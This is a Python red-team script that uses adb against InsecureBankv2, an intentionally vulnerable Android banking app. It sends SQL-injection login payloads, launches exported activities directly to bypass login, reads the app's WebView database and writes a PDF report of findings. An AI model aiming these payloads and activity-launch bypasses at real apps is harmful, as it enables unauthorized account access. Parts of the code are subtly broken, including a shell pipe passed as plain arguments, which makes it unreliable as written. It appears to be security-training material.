from typing import Dict, List, Optional
import subprocess
import json
import datetime
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import os
import argparse
from fpdf import FPDF

class RedTeamReport(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 15)
        self.cell(0, 10, 'InsecureBankv2 Red Team Assessment', 0, 1, 'C')
        self.ln(10)

    def footer(self):
        self.set_y(-15)
        self.set_font('Arial', 'I', 8)
        self.cell(0, 10, f'Page {self.page_no()}', 0, 0, 'C')

    def chapter_title(self, title):
        self.set_font('Arial', 'B', 12)
        self.set_fill_color(200, 220, 255)
        self.cell(0, 10, title, 0, 1, 'L', True)
        self.ln(4)

    def chapter_body(self, body):
        self.set_font('Arial', '', 11)
        self.multi_cell(0, 5, body)
        self.ln()

class RedTeamSimulation:
    def __init__(self, target_package="com.android.insecurebankv2"):
        self.target_package = target_package
        self.report_data = {
            'findings': [],
            'attacks': [],
            'vulnerabilities': []
        }
        self.results_dir = "simulation_results"
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs(self.results_dir, exist_ok=True)

    def check_adb_connection(self):
        """Check if device is connected and app is installed"""
        try:
            # Check ADB connection
            result = subprocess.run(["adb", "devices"], capture_output=True, text=True)
            if len(result.stdout.strip().split('\n')) <= 1:
                print("[-] No Android device connected")
                return False

            # Check if app is installed
            result = subprocess.run(
                ["adb", "shell", "pm", "list", "packages", self.target_package],
                capture_output=True,
                text=True
            )
            if self.target_package not in result.stdout:
                print(f"[-] {self.target_package} not installed")
                return False

            print("[+] Device connected and app installed")
            return True
        except Exception as e:
            print(f"[-] Error checking ADB: {e}")
            return False

    def test_sql_injection(self):
        """Test SQL injection vulnerabilities"""
        print("\n[*] Testing SQL Injection vulnerabilities...")
        
        payloads = [
            "' OR '1'='1",
            "admin' --",
            "' UNION SELECT '1",
            "' OR 1=1 --"
        ]
        
        findings = []
        for payload in payloads:
            try:
                print(f"[*] Trying payload: {payload}")
                cmd = [
                    "adb", "shell", "am", "start", "-n",
                    f"{self.target_package}/.LoginActivity",
                    "--es", "username", payload,
                    "--es", "password", payload
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                # Check if we got to PostLogin activity
                time.sleep(1)
                current_activity = subprocess.run(
                    ["adb", "shell", "dumpsys", "window", "windows", "|", "grep", "-i", "mCurrentFocus"],
                    capture_output=True,
                    text=True
                )
                
                if "PostLogin" in current_activity.stdout:
                    findings.append({
                        'type': 'sql_injection',
                        'payload': payload,
                        'status': 'vulnerable'
                    })
                    print(f"[!] SQL Injection successful with: {payload}")
            
            except Exception as e:
                print(f"[-] Error testing payload {payload}: {e}")
        
        self.report_data['findings'].extend(findings)
        return findings

    def test_intent_vulnerabilities(self):
        """Test for intent-based vulnerabilities"""
        print("\n[*] Testing intent vulnerabilities...")
        
        findings = []
        try:
            # Test direct activity access
            activities = [
                ".PostLogin",
                ".DoTransfer",
                ".ViewStatement"
            ]
            
            for activity in activities:
                cmd = [
                    "adb", "shell", "am", "start", "-n",
                    f"{self.target_package}/{activity}"
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if "Error" not in result.stderr:
                    findings.append({
                        'type': 'intent_vulnerability',
                        'activity': activity,
                        'status': 'vulnerable'
                    })
                    print(f"[!] Found vulnerable activity: {activity}")
        
        except Exception as e:
            print(f"[-] Error testing intents: {e}")
        
        self.report_data['findings'].extend(findings)
        return findings

    def test_webview_vulnerabilities(self):
        """Test WebView vulnerabilities"""
        print("\n[*] Testing WebView vulnerabilities...")
        
        findings = []
        try:
            # Check for JavaScript enabled
            cmd = [
                "adb", "shell", "run-as", self.target_package,
                "cat", "/data/data/com.android.insecurebankv2/app_webview/WebView.db"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "javascript_enabled" in result.stdout.lower():
                findings.append({
                    'type': 'webview_vulnerability',
                    'issue': 'JavaScript enabled',
                    'status': 'vulnerable'
                })
                print("[!] WebView JavaScript enabled")
        
        except Exception as e:
            print(f"[-] Error testing WebView: {e}")
        
        self.report_data['findings'].extend(findings)
        return findings

    def generate_report(self):
        """Generate PDF report of findings"""
        try:
            report_file = os.path.join(self.results_dir, f"redteam_report_{self.timestamp}.pdf")
            
            pdf = RedTeamReport()
            pdf.add_page()
            
            # Title
            pdf.set_font('Arial', 'B', 24)
            pdf.cell(0, 60, 'InsecureBankv2 Red Team Assessment', 0, 1, 'C')
            pdf.set_font('Arial', '', 12)
            pdf.cell(0, 10, f'Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', 0, 1, 'C')
            
            # Findings
            pdf.add_page()
            pdf.chapter_title('Vulnerabilities Found')
            
            for finding in self.report_data['findings']:
                pdf.set_font('Arial', 'B', 11)
                pdf.cell(0, 10, f"Type: {finding['type']}", 0, 1)
                pdf.set_font('Arial', '', 11)
                
                for key, value in finding.items():
                    if key != 'type':
                        pdf.cell(0, 5, f"{key}: {value}", 0, 1)
                pdf.ln(5)
            
            pdf.output(report_file)
            print(f"\n[+] Report generated: {report_file}")
            
        except Exception as e:
            print(f"[-] Error generating report: {e}")

def main():
    parser = argparse.ArgumentParser(description='Red Team Simulation for InsecureBankv2')
    parser.add_argument('--sql', action='store_true', help='Test SQL injection vulnerabilities')
    parser.add_argument('--intent', action='store_true', help='Test intent vulnerabilities')
    parser.add_argument('--webview', action='store_true', help='Test WebView vulnerabilities')
    parser.add_argument('--all', action='store_true', help='Run all tests')
    
    args = parser.parse_args()
    
    simulator = RedTeamSimulation()
    
    if not simulator.check_adb_connection():
        return
    
    if args.all or args.sql:
        simulator.test_sql_injection()
    
    if args.all or args.intent:
        simulator.test_intent_vulnerabilities()
    
    if args.all or args.webview:
        simulator.test_webview_vulnerabilities()
    
    simulator.generate_report()

if __name__ == "__main__":
    main()
